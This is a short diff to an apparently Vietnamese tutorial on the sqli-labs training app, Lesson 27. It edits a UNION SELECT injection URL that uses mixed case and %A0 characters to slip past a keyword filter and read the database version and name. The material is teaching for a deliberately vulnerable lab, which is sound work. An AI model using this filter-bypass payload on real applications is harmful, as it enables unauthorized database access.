@@ -16,7 +16,7 @@ Chúng ta để ý rằng làm như vậy không còn được nữa. Chúng ta 
 Nhưng khi viết trộn lẫn giữa ký tự hoa và thường nó sẽ có một kết quả khác 
 
 ```
-http://192.168.80.225/sqli-labs/Less-27/?id=0%27%A0UnIoN%A0SeLeCt(1),version(),database()%26%26%a0%271
+http://192.168.80.225/sqli-labs/Less-27/?id=0%27%A0UnIoN%A0SeLeCt(1),version(),database()%a0%271
 ```
 
 ![](../images/lesson27/screen_3.png)
